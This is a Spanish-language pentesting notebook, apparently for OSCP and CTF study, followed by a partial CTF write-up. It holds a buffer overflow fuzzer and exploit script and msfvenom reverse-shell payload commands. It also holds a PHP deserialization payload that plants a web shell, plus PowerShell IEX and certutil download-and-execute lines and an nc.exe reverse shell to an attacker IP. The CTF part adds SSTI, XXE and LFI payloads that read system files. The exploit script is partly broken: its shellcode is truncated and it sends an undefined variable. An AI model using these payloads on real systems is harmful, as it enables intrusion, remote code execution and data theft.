<tr><td><code>checksec</code></td><td>RELRO</td><td>{Full, PARTIAL} RELRO</td><td>Indica la capacidad que se tiene para la lectura y escritura. *TODO: Verificar mas adelante</td></tr>
</tbody></table>
</div>
<p>Usualmente el llamar directamente a la pila no retorna una shell, por lo que hay que buscar instrucciones de tipo <code>jmp</code> y <code>call</code>, pudiendo hacer un filtrado de estas instrucciones con <code>grep</code>. Ejemplo: <code>objdump -d [binario] | grep jmp</code>. Teniendo en cuenta que deberían apuntar a los ROP Gadgets ya sea de 32 o 64 bits respectivamente.</p>
<pre><code class="language-bash">jmp: ff e0 (hexadecimal) *%rax
call: ff d0 (hexadecimal) *%rax
</code></pre>
<p>Para sacar offset en gdb:</p>
<ul>
<li>Setear breakpoint antes de que termine el programa</li>
<li>Ejecutar:</li>
</ul>
<pre><code class="language-bash">info frame

x/24wx $rsp

p/d rip - rsp
</code></pre>
<h2 id="debugging-local"><a class="header" href="#debugging-local">Debugging Local</a></h2>
<h3 id="consideraciones"><a class="header" href="#consideraciones">Consideraciones</a></h3>
<p>Para debuggear localmente un binario tener en cuenta la protección <code>ASLR</code>.</p>
<ul>
<li>Para deshabilitar: <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></li>
<li>Para habilitar: <code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code></li>
<li>Para deshabilitar permanentemente, es necesario configurarlo en <code>sysctl</code>. Agregar el archivo <code>/etc/sysctl.d/01-disable-aslr.conf</code> con el contenido: <code>kernel.randomize_va_space = 0</code></li>
</ul>
<h2 id="gdb-1"><a class="header" href="#gdb-1">GDB</a></h2>
<p>set disassembly-flavor intel</p>
<h2 id="script-de-exploit-base"><a class="header" href="#script-de-exploit-base">Script de exploit base</a></h2>
<p>TODO</p>
<h2 id="tips-n-tricks"><a class="header" href="#tips-n-tricks">Tips n' tricks</a></h2>
<h3 id="getenvvarc"><a class="header" href="#getenvvarc">getenvvar.c</a></h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
   char *ptr;

   if(argc &lt; 3) {
      printf(&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;, argv[0]);
      exit(0);
   }
   ptr = getenv(argv[1]); /* Get env var location. */
   ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
   printf(&quot;%s will be at %p\n&quot;, argv[1], ptr);
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="oscp-buffer-overflow-cheat-sheet"><a class="header" href="#oscp-buffer-overflow-cheat-sheet">OSCP Buffer Overflow Cheat Sheet</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Fuzzing</th><th></th></tr></thead><tbody>
<tr><td><code>msf-pattern_create -l &lt;longitud de bytes&gt;</code></td><td>Generación de patrón</td></tr>
<tr><td><code>!mona pattern_create &lt;longitud de bytes&gt;</code></td><td>Generación de patrón</td></tr>
<tr><td><code>msf-pattern_create -l &lt;EIP&gt;</code></td><td>Identificación offset</td></tr>
<tr><td><code>!mona pattern_offset &lt;EIP&gt;</code></td><td>Identificación offset</td></tr>
</tbody></table>
</div>
<h2 id="fuzzerpy"><a class="header" href="#fuzzerpy"><code>fuzzer.py</code></a></h2>
<pre><code class="language-python">#from pwn import *
import socket, sys, time

if len(sys.argv) &lt; 2:
   print &quot;\n[!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt; &quot; + &quot;&lt;remote-port&gt;\n&quot;
   sys.exit(0)

ip_address = sys.argv[1]
rport = int(sys.argv[2])

if __name__ == '__main__':
   contador = 100
   #p1 = log.progress(&quot;Data&quot;) Log de datos en pwntools
   while True:
      #p1.status(f&quot;Enviando {contador} bytes.&quot;) Log de datos en pwntools
      print &quot;Enviando %s bytes.&quot; % contador
      buffer = 'A' * contador
      try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip_address, rport))

         data = s.recv(1024)
         s.send(&quot;%s\r\n&quot; % buffer)
         data = s.recv(1024)
         contador += 100
         time.sleep(1)
      except Exception as ex:
         print &quot;\n[!] Ha habido un error de conexion\n&quot;
         print ex
         sys.exit(1)
</code></pre>
<h2 id="bad-chars"><a class="header" href="#bad-chars">Bad Chars</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Identificar Bad Chars</th><th></th></tr></thead><tbody>
<tr><td><code>!mona bytearray -cpb '\x00'</code></td><td>Generación de bytearray con excepciones</td></tr>
<tr><td><code>!mona compare -f &lt;ubicacion de byte array .bin&gt; -a &lt;dirección de ESP&gt;</code></td><td>Comparación de bytearray contra ESP</td></tr>
</tbody></table>
</div>
<h3 id="colección-en-arreglo-1"><a class="header" href="#colección-en-arreglo-1">Colección en arreglo</a></h3>
<pre><code class="language-python">badchars = (
  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
)
</code></pre>
<h3 id="colección-plana-1"><a class="header" href="#colección-plana-1">Colección plana</a></h3>
<p><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</code></p>
<h2 id="búsqueda-para-ejecución"><a class="header" href="#búsqueda-para-ejecución">Búsqueda para ejecución</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Búsqueda de <code>jmp esp</code></th><th></th></tr></thead><tbody>
<tr><td><code>!mona modules</code></td><td>Generación de patrón</td></tr>
<tr><td><code>!mona find -s &quot;\xff\xe4&quot; -m &lt;nombre de dll&gt;</code></td><td>Generación de patrón</td></tr>
</tbody></table>
</div>
<h2 id="payload"><a class="header" href="#payload">Payload</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Generación de payload</th><th></th></tr></thead><tbody>
<tr><td><code>msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\x00' EXITFUNC=thread -i 3 -f python &gt; scode.txt</code></td><td>Encoder <code>shikata ga nai</code></td></tr>
<tr><td><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\x00' EXITFUNC=thread -f python &gt; scode.txt</code></td><td>Sin encoder y si iteraciones</td></tr>
</tbody></table>
</div>
<h2 id="exploit-final"><a class="header" href="#exploit-final">Exploit final</a></h2>
<pre><code class="language-python">from struct import pack
import socket, sys

if len(sys.argv) &lt; 2:
    print &quot;\n [!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt;&quot; + &quot;&lt;remote-port&gt; \n&quot;
    sys.exit(0)

ip_address = sys.argv[1]
rport = int(sys.argv[2])

shellcode =  b&quot;&quot;
shellcode += b&quot;\xb8\x36\xda\x75\x0f\xda\xd5\xd9\x74\x24\xf4\x5b\x2b&quot;

#badchars = ()
#badchars \x00\x23\x3c\x83\xba

if __name__ == &quot;__main__&quot;:
   prefix = &quot;&quot;
   offset = 1052
   filler = &quot;A&quot; * offset
   eip = pack(&quot;&lt;L&quot;, 0x68a98a7b)
   nops = &quot;\x90&quot; * 16
   #nops = &quot;\x83\xEC\x10&quot; # sub esp, 0x10

   #payload = prefix + filler + eip + badhchars
   payload = prefix + filler + eip + nops + shellcode

   try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip_address, rport))
      s.send(&quot;%s\r\n&quot; % buffer)
   except Exception as ex:
      print &quot;[!] Ha habido un error de conexion&quot;
      print ex
      sys.exit(1)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="fuzzing-1"><a class="header" href="#fuzzing-1">Fuzzing</a></h1>
<p>Considerar diferencia de rutas respecto a archivos y directorios. No son lo mismo.</p>
<ul>
<li>/cgi-bin</li>
<li>/cgi-bin/</li>
</ul>
<p>Considerar códigos de estatus <code>500</code> como ruta existente aunque sea error de servidor.</p>
<p>Considerar sintaxis de <code>fuzzer</code> para búsqueda recursiva.
<em>TODO: Buscar sintaxis de ffuf y añadirlo a notas.</em>
Es decir: <code>http://sitio.com/FUZZ_padre/FUZZ_hijo</code></p>
<p>Cuando se enumera un API tratar con el singular y el plural de la API considerando también los <code>ids</code> del endpoint. Por ejemplo:</p>
<ul>
<li><code>http://10.10.10.10/FUZZ</code> revela <code>http://10.10.10.10/flows</code> y <code>flows</code> revela algunos ids.</li>
<li>Considerar fuzzear <code>http://10.10.10.10/FUZZ/ID_encontrado</code>.</li>
<li>Buscar el singular <code>http://10.10.10.10/flow/ID_encontrado</code>.</li>
</ul>
<h1 id="ffuf"><a class="header" href="#ffuf">ffuf</a></h1>
<h2 id="subdomain-discovery"><a class="header" href="#subdomain-discovery">Subdomain Discovery</a></h2>
<p><code>ffuf -c -w /path/to/vhost/wordlist -u https://target.com -H &quot;Host: FUZZ.target.com&quot; -ic</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server-Side Template Injection</a></h1>
<p>TODO</p>
<h1 id="php-object-injection"><a class="header" href="#php-object-injection">PHP Object Injection</a></h1>
<h2 id="código"><a class="header" href="#código">Código</a></h2>
<pre><code class="language-php">class foobarzoo {
    public $csv=&quot;entries.csv&quot;;
    public $line=null;
    
    function __destruct() {
        file_put_contents($this-&gt;csv,$this-&gt;line);
    }
}
</code></pre>
<h2 id="payload-de-explotación"><a class="header" href="#payload-de-explotación">Payload de explotación</a></h2>
<p><code>data=O:9:&quot;foobarzoo&quot;:2:{s:3:&quot;csv&quot;;s:8:&quot;evil.php&quot;;s:4:&quot;line&quot;;s:28:&quot;&lt;?php system($_GET[&quot;cmd&quot;])?&gt;&quot;;}</code></p>
<p>Donde en <code>O:9:&quot;foobarzoo&quot;:2:</code>:</p>
<ul>
<li><code>O</code> → tipo de dato (objeto).</li>
<li><code>0</code> → longitud dato.</li>
<li><code>2</code> → cantidad de propiedades.</li>
</ul>
<p>Donde en <code>s:3:&quot;csv&quot;;s:8:&quot;evil.php&quot;</code>:</p>
<ul>
<li><code>s</code> → tipo de dato (string).</li>
<li><code>3</code> → longitud dato.</li>
<li><code>csv</code> → nombre de propiedad.</li>
<li><code>evil.php</code> → valor de propiedad.</li>
</ul>
<h2 id="referencias-5"><a class="header" href="#referencias-5">Referencias</a></h2>
<ul>
<li>https://insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf</li>
<li>https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</li>
<li>https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/</li>
<li>https://security.stackexchange.com/questions/176263/why-does-this-php-object-injection-exploit-work</li>
<li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/628481cd4d9c9f7db980a6a92c446d22c26a4aad/Insecure%20Deserialization/PHP.md</li>
</ul>
<h1 id="sql"><a class="header" href="#sql">SQL</a></h1>
<h2 id="sqlmap"><a class="header" href="#sqlmap">sqlmap</a></h2>
<p>https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-(Login-Form-User).html</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="transferencia-de-archivos"><a class="header" href="#transferencia-de-archivos">Transferencia de archivos</a></h1>
<h2 id="linux-3"><a class="header" href="#linux-3">Linux</a></h2>
<p>Descarga recursiva de archivos en FTP:</p>
<pre><code class="language-bash">wget -r --no-passive ftp://&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;/
</code></pre>
<h2 id="windows-3"><a class="header" href="#windows-3">Windows</a></h2>
<pre><code class="language-powershell">certutil.exe -f -urlcache -split http://10.10.14.9/nc.exe nc.exe

# Ejecutar scripts en sesión
powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/nishang.ps1')

# Descargar cualquier tipo de archivo
powershell.exe Invoke-WebRequest -Uri http://10.10.14.9/nc.exe -OutFile nc.exe

# Compartir archivos por smb y ejecutar sin necesidad de descargar
## Escucha / Atacante
impacket-smbserver smbFolder $(pwd) -smb2support
## Ejecución / Victima
cmd /c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 1234
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ipn-core-2022-ctf---writeup"><a class="header" href="#ipn-core-2022-ctf---writeup">IPN Core 2022 CTF - Writeup</a></h1>
<h2 id="tabla-de-contenido-4"><a class="header" href="#tabla-de-contenido-4">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#resumen-de-vulnerabilidades">Resumen de vulnerabilidades</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#web">Web</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#pentest-web-parte-1">Pentest web Parte 1</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#pentest-web-parte-2">Pentest web Parte 2</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-1">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-1">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#pentest-web-parte-3">Pentest web Parte 3</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-2">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-2">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#cic-blog">CIC Blog</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-3">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-3">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#tacos-don-chano">Tacos Don Chano</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-4">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-4">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#crypto">Crypto</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#encoding">Encoding</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-5">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-5">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#esoteric0">Esoteric0</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-6">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-6">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#aesy">AESy</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-7">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-7">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#realbabyrsa">RealBabyRSA</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-8">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-8">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#baby-fa">Baby-FA</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-9">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-9">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#reversing">Reversing</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#t3sla">T3SLA</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-10">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-10">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#t3sla---parte-2">T3SLA - Parte 2</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-11">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-11">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#t3sla---parte-3">T3SLA - Parte 3</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-12">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-12">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#pwning">Pwning</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#babypwn">BabyPWN</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-13">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-13">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#babypwn---parte-2">BabyPWN - Parte 2</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-14">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-14">Solución</a></li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#babypwn---parte-3">BabyPWN - Parte 3</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-15">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-15">Solución</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#misc">Misc</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#bot-calculadora">Bot Calculadora</a>
<ul>
<li><a href="ctfs/20220922_ctf-core2022/index.html#info-16">Info</a></li>
<li><a href="ctfs/20220922_ctf-core2022/index.html#soluci%C3%B3n-16">Solución</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="resumen-de-vulnerabilidades"><a class="header" href="#resumen-de-vulnerabilidades">Resumen de vulnerabilidades</a></h2>
<ul>
<li>SSRF</li>
<li>SSTI</li>
<li>XXE</li>
<li>LFI + php filters</li>
<li>SQLi</li>
<li>AES CBC Bit Flipping</li>
<li>RSA Common Modulus</li>
</ul>
<h2 id="web"><a class="header" href="#web">Web</a></h2>
<h3 id="pentest-web-parte-1"><a class="header" href="#pentest-web-parte-1">Pentest web Parte 1</a></h3>
<h4 id="info"><a class="header" href="#info">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Uhmm no necesitas contexto...</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_pentest_web_1.zip">web_pentest_web_1.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución"><a class="header" href="#solución">Solución</a></h4>
<p>Al interactuar con la página web, se puede visualizar en el código fuente un comentario que indica el lugar donde se encuentra ubicada la bandera.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_1_1.png" alt="Ubicación de bandera" /></p>
<p>Tomando en cuenta esto, se pudiera sospechar de algún tipo de inclusión de archivos locales o algo por el estilo. Continuando con la interacción del sitio se puede visualizar una excepción del método <code>fopen</code> de php el cuál esta recibiendo el contenido del input disponible.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_1_2.png" alt="Excepción de fopen" /></p>
<p>Si se busca en el <a href="https://open.spotify.com/playlist/0VHNhrWyp0X3CdCdhyRQyI?si=73871d004a434312">manual de php acerca de la función</a>, se puede visualizar que esta recibirá como parámetro una ruta de un directorio, por lo que si se emplea un archivo existente como <code>/flag.txt</code> se podrá visualizar su contenido, realizando la petición con <code>curl</code> o a través de algún proxy como <code>BurpSuite</code>.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_1_3.png" alt="Contenido de flag.txt" /></p>
<p>Flag: <code>CTF{9700cbd3cd4dc8c2010953ca1a029bd0}</code></p>
<h3 id="pentest-web-parte-2"><a class="header" href="#pentest-web-parte-2">Pentest web Parte 2</a></h3>
<h4 id="info-1"><a class="header" href="#info-1">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Uhmm nop, no necesitas descripción... ¿o sí?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_pentest_web_2.zip">web_pentest_web_2.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-1"><a class="header" href="#solución-1">Solución</a></h4>
<p>Se puede visualizar un input el cuál al enviar/completar la petición se refleja nuestro contenido.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_2_1.png" alt="Contenido de input reflejado" /></p>
<p>Al tratar de reconocer las tecnologías que &quot;hostean&quot; el reto, se pudieron identificar por las cabeceras de las respuestas del servidor la versión de una librería y versión de Python (<code>Werkzeug/2.2.2 Python/3.8.14</code>).</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_2_2.png" alt="Versión de Python" /></p>
<p>Al identificar esto, lo primero que pudiera llegarse a considerar es que el código HTML este siendo pre-procesado por esta librería de Python. En el proceso de ese pre-procesamiento se pueden encontrar vulnerabilidades de inyección de plantillas (SSTI), por lo que al hacer uso de <code>{{7*7}}</code> en el campo de nombre se pudo validar que se trataba de esto en cuestión.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_2_3.png" alt="Inyección" /></p>
<p>Utilizando el siguiente payload se podía leer la bandera:</p>
<pre><code class="language-python">{{ request.__class__._load_form_data.__globals__.__builtins__.open(&quot;/flag.txt&quot;).read() }}
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_2_4.png" alt="Inyección" /></p>
<p>Flag: <code>CTF{d4bac92d0e15c50d3431043e27c62163}</code></p>
<h3 id="pentest-web-parte-3"><a class="header" href="#pentest-web-parte-3">Pentest web Parte 3</a></h3>
<h4 id="info-2"><a class="header" href="#info-2">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Es divertido el pentest web desde Blackbox ¿no? :)</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_pentest_web_3.zip">web_pentest_web_3.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-2"><a class="header" href="#solución-2">Solución</a></h4>
<p>Al entrar en la web se visualizan dos enlaces en los cuales, en uno de ellos nos revela la ubicación de la flag (<code>/flag</code>) y en el otro nos permite interactuar con un submit brindándonos una caja de texto en la que podamos mandar un saludo (<code>/rest</code>). Al mandar una prueba se puede visualizar una excepción relacionada con XML.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_3_1.png" alt="Excepción XML" /></p>
<p>A lo que lleva a concluir de una vulnerabilidad de tipo XXE, al buscar y encontrar el siguiente payload:</p>
<pre><code class="language-xml">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/flag.txt&quot;&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p>Se pudo obtener la bandera incluyendo el archivo y desplegando el archivo indicado.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_pentest_3_2.png" alt="Inclusión de bandera" /></p>
<p>Flag: <code>CTF{e4b50e71a8f7ec1f5c3b8db6a91ce2ff}</code></p>
<h3 id="cic-blog"><a class="header" href="#cic-blog">CIC Blog</a></h3>
<h4 id="info-3"><a class="header" href="#info-3">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Qué tal? Estoy por terminar mi blog y un colega de {|4_p4nd1||4_m4nt3q1||4}  me hizo favor de revisar el sitio, había encontrado algo pero aún no termina.  Mientras tanto me gustaría saber que encontró, ¿me ayudas también a revisarlo?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_cic_blog.zip">web_cic_blog.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-3"><a class="header" href="#solución-3">Solución</a></h4>
<p>Al buscar información dentro del código fuente se puede visualizar un wrapper de contenido dentro de la barra lateral izquierda, indicando mediante el parámetro <code>page</code> la página a cargar.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_cic_blog_1.png" alt="Inclusión de archivos" /></p>
<p>Al realizar una prueba para buscar incluir un archivo de sistema se puede visualizar su contenido <code>/wrapper.php?page=/etc/passwd</code>:</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_cic_blog_2.png" alt="Inclusión passwd" /></p>
<p>Posteriormente, al no encontrar la bandera dentro de la raíz del sistema (<code>/flag.txt</code> o algo similar), se buscó fuzzear el sitio para ver si se encontraba información al respecto.</p>
<pre><code class="language-bash">ffuf -c -ic -u &quot;http://192.168.111.153:8000/FUZZ&quot; -w /usr/share/wordlists/dirb/common.txt
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_cic_blog_3.png" alt="Fuzzing" /></p>
<p>Encontrando así varias entradas incluyendo <code>robots.txt</code>, la cual exponía mediante una regla de <code>Disallow</code> la ruta de la bandera.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_cic_blog_4.png" alt="robots.txt" /></p>
<p>Al incluir la ruta de la bandera se podía procesar su contenido <code>/wrapper.php?page=/var/www/flag.php</code> mencionando como pista &quot;pensar en algo diferente&quot;.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_cic_blog_5.png" alt="flag.php" /></p>
